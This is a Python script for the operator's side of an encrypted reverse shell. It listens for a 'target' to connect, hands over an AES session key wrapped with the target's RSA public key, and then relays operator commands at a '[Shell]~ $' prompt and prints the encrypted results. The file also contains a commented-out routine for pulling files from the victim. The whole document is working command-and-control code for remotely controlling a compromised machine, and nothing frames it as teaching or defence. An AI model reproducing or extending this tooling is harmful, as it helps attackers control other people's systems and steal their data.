import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random
import os

IV = b"H" * 16
# Randomly generate unique session key for this connection
key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))
# Send session key to target; encrypting it with targets public key
def SEND_AES(message):
    # Targets publicKey; needed to encrypt the session key to be sent to target
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2puYAHteyYvUCG9Jl2bv
GLF773uzVJPOMQ9EIRNvVaQ45tQV8sbxw1KR8FE66l5NH8jn2oYn7BZmO1Q+hwoA
lFtGI0kOYmR9l4A3IzSdttjmtQA8zGjNkTjj7dyufu2v77BsRNOSJTne3TIoL/Q/
T3LCVraHLVXO+YNEtKqdNpknJ6Lj2GSvsfr0WGy9hsOJq5/4hlGqjoiHhQOiO2CZ
fu0LJWOgLjv05JWb/R4Nu2DSGxdvcEvqW22W6IrjTQt5RW2Ng32cZu/44nUek8EU
aEyF7HBn5gmyVVDGyVOp2fQdI/1ZU4FM0aglzVE+T9ATP2RMdGMN9lbV+8yqL8n9
+KRXCoJeZhqbbw7vklYTlo33nmVXWlhnyxpf7E0Hmt2xaLqxTmtrxwmuwPb+J3h3
fuZZKLIdIcIFWSxa0x5DHn10to4fnOCP3mv9H4c2B99FpPShtTJbY4J1QKMygQzK
U4H4dm0Ybv3dPZJAinVjDv19lLSvLU+bXOpmRb06whs1hEMrxdRVhhfb3xPjiWjX
utXDt/4jc5wOJ/PMF02Lp8C/3L1Yboa7OZipxikL0btDJyl6F3yvJmR3c3SyKzCf
AmZ4xIclWkwhTDPHJpkYTPHlz7UYlfzA9jn76b/6EjLj6z95RmdY9JMUnMDLTNik
OH+1YoEcaCZE6iY19ePaqjECAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData
def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message
def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,16)
    return decrypted_message
'''
def fileTransfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(encrypt(packet).encode())
            packet = f.read()
        s.send(encrypt('DONE'.encode()))
    else:
        s.send(encrypt('[-] File not found =('))
'''
def connect():
    s = socket.socket()
    s.bind(('127.0.0.1', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connections on port 8080')
    conn, addr = s.accept()
    conn.send(SEND_AES(key.encode()))
    while True:
        store = ''
        ogCommand = input("[Shell]~ $ ")
        try:
            conn.send(encrypt(ogCommand.encode()))
        except ValueError as e:
            print('zero length input?')
        if 'nuke' in ogCommand:
            conn.close()
            break
        elif ogCommand == 'clear':
            os.system('clear')
        elif ogCommand[:3] == 'cd ':
            pass
        else:
            result = conn.recv(1024)
            try:
                print(decrypt(result).decode())
            except:
                print("[-] Uh-oh! Something went wrong =(")
connect()

